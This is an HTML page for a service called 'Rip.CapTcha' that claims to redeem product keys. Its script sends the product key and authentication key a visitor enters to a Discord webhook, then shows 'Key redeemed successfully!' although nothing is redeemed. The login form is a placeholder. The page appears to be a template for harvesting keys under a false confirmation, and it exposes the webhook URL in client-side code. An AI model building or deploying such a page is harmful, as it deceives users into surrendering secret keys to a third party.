<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Rip.CapTcha Key Redeem</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    /* Custom scrollbar for dark theme */
    ::-webkit-scrollbar {
      width: 8px;
    }
    ::-webkit-scrollbar-track {
      background: #0f172a;
    }
    ::-webkit-scrollbar-thumb {
      background-color: #3b82f6;
      border-radius: 10px;
    }
  </style>
</head>
<body class="bg-[#0f172a] min-h-screen flex flex-col">

  <!-- Navbar -->
  <nav class="w-full flex items-center justify-between bg-[#121d38] px-6 py-4 shadow-md select-none">
    <div class="flex items-center space-x-2 text-[#3b82f6] font-semibold text-lg cursor-pointer select-text">
      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="#3b82f6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <line x1="12" y1="5" x2="12" y2="19" />
        <line x1="5" y1="12" x2="19" y2="12" />
      </svg>
      <span>Rip.CapTcha</span>
    </div>
    <div>
      <button id="loginBtn" class="flex items-center text-white hover:text-[#3b82f6] transition select-none">
        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-1" fill="none" viewBox="0 0 24 24" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M16 21v-2a4 4 0 00-3-3.87" />
          <path d="M12 7a4 4 0 100-8 4 4 0 000 8z" />
          <path d="M4 19a9 9 0 0116 0" />
        </svg>
        Login
      </button>
    </div>
  </nav>

  <!-- Main Content -->
  <main class="flex-grow flex flex-col items-center justify-center px-4 py-12 space-y-10">

    <!-- Login Form -->
    <section id="loginSection" class="hidden max-w-xl w-full rounded-lg bg-[#1e293b] p-7 shadow-lg">
      <h2 class="text-2xl font-bold text-[#3b82f6] text-center">Welcome Back</h2>
      <p class="text-gray-300 text-sm text-center">Sign in to your account</p>
      <form id="loginForm" class="flex flex-col space-y-4 mt-4">
        <select class="bg-[#334155] text-white rounded-md p-3" id="accountType" required>
          <option value="" disabled selected>Account Type</option>
          <option value="admin">Tenant Admin</option>
          <option value="user">User</option>
        </select>
        <input 
          id="username" 
          type="text" 
          placeholder="USERNAME" 
          required 
          autocomplete="off"
          class="bg-[#334155] placeholder-gray-400 text-white rounded-md p-3 focus:outline-none focus:ring-2 focus:ring-[#3b82f6] transition"
        />
        <input 
          id="password" 
          type="password" 
          placeholder="PASSWORD" 
          required 
          autocomplete="off"
          class="bg-[#334155] placeholder-gray-400 text-white rounded-md p-3 focus:outline-none focus:ring-2 focus:ring-[#3b82f6] transition"
        />
        <button 
          type="submit" 
          class="bg-[#3b82f6] text-white font-semibold rounded-md py-3 hover:bg-[#2563eb] transition"
        >Sign In</button>
      </form>
      <p id="loginStatus" class="mt-3 text-center text-sm text-red-500 font-medium select-none"></p>
    </section>

    <!-- Card 1: Branding and info -->
    <section class="max-w-xl w-full rounded-lg bg-[#1e293b] p-7 text-center shadow-lg" id="infoSection">
      <div class="flex flex-col items-center space-y-2 select-text">
        <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 text-[#3b82f6]" fill="none" viewBox="0 0 24 24" stroke="#3b82f6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M15 10l4.553-2.276A2 2 0 0020 6.382V4a2 2 0 00-2-2h-6a2 2 0 00-2 2v3" />
          <path d="M9 13v4a2 2 0 002 2h4a2 2 0 002-2v-4" />
          <circle cx="12" cy="12" r="10" stroke="#3b82f6" stroke-width="2" />
        </svg>
        <h1 class="text-2xl font-bold text-[#3b82f6]">Rip.CapTcha</h1>
        <p class="text-gray-300 text-sm font-light">Advanced Key Management Platform</p>
        <div class="flex justify-center space-x-8 mt-3 text-gray-400 text-xs font-light select-text">
          <a href="https://ripcaptcha.net/store" class="hover:text-[#3b82f6] transition" target="_blank" rel="noopener noreferrer">ripcaptcha.net/store</a>
          <a href="https://discord.gg/ripcaptcha" class="hover:text-[#3b82f6] transition" target="_blank" rel="noopener noreferrer">discord.gg/ripcaptcha</a>
        </div>
      </div>
    </section>

    <!-- Card 2: Redeem Key Form -->
    <section class="max-w-xl w-full rounded-lg bg-[#1e293b] p-7 shadow-lg" id="redeemKeySection">
      <form id="redeemForm" class="flex flex-col space-y-4">
        <div class="flex items-center space-x-2 mb-2">
          <span class="text-[#3b82f6] font-bold text-lg select-text">Redeem Your Key</span>
          <div class="text-[#3b82f6] text-2xl font-bold select-text">Â°</div>
        </div>
        <input 
          id="productKey" 
          type="text" 
          placeholder="ENTER YOUR PRODUCT KEY" 
          required 
          autocomplete="off"
          class="bg-[#334155] placeholder-gray-400 text-white rounded-md p-3 focus:outline-none focus:ring-2 focus:ring-[#3b82f6] transition"
        />
        <input 
          id="authKey" 
          type="text" 
          placeholder="ENTER YOUR AUTHENTICATION KEY" 
          required 
          autocomplete="off"
          class="bg-[#334155] placeholder-gray-400 text-white rounded-md p-3 focus:outline-none focus:ring-2 focus:ring-[#3b82f6] transition"
        />
        <button 
          type="submit" 
          class="bg-[#3b82f6] text-white font-semibold rounded-md py-3 hover:bg-[#2563eb] transition"
        >Submit</button>
      </form>
      <p id="statusMsg" class="mt-3 text-center text-sm text-red-500 font-medium select-none"></p>
    </section>

  </main>

  <script>
    // Discord webhook URL: you need to replace this with your actual webhook url
    const DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE";

    // Reference status message paragraphs
    const statusMsg = document.getElementById("statusMsg");
    const loginStatus = document.getElementById("loginStatus");

    // Redeem form submission handler
    document.getElementById("redeemForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      statusMsg.textContent = "";
      const productKey = document.getElementById("productKey").value.trim();
      const authKey = document.getElementById("authKey").value.trim();

      if (!productKey || !authKey) {
        statusMsg.textContent = "Please fill out both keys.";
        return;
      }

      // Prepare the content to send to Discord webhook
      const content = {
        username: "Rip.CapTcha Redeemer",
        embeds: [
          {
            title: "Key Redeemed",
            color: 3447003,
            fields: [
              { name: "Product Key", value: productKey, inline: true },
              { name: "Authentication Key", value: authKey, inline: true }
            ],
            footer: {
              text: "Rip.CapTcha - Advanced Key Management Platform"
            },
            timestamp: new Date().toISOString()
          }
        ],
      };

      try {
        // Send data to webhook using fetch
        const response = await fetch(DISCORD_WEBHOOK_URL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(content)
        });

        if (response.ok) {
          statusMsg.classList.remove("text-red-500");
          statusMsg.classList.add("text-green-400");
          statusMsg.textContent = "Key redeemed successfully!";
          e.target.reset();
        } else {
          throw new Error("Webhook request failed");
        }
      } catch (error) {
        statusMsg.classList.remove("text-green-400");
        statusMsg.classList.add("text-red-500");
        statusMsg.textContent = "Failed to submit keys. Try again later.";
        console.error(error);
      }
    });

    // Login button handler
    document.getElementById("loginBtn").addEventListener("click", () => {
      const loginSection = document.getElementById("loginSection");
      const infoSection = document.getElementById("infoSection");
      const redeemKeySection = document.getElementById("redeemKeySection");
      loginSection.classList.toggle("hidden");
      infoSection.classList.toggle("hidden");
      redeemKeySection.classList.toggle("hidden");
    });

    // Login form submission handler
    document.getElementById("loginForm").addEventListener("submit", (e) => {
      e.preventDefault();
      loginStatus.textContent = "Logged in successfully!"; // Placeholder action
      document.getElementById("loginSection").classList.add("hidden");
      document.getElementById("infoSection").classList.remove("hidden");
      document.getElementById("redeemKeySection").classList.remove("hidden");
    });
  </script>

</body>
</html>
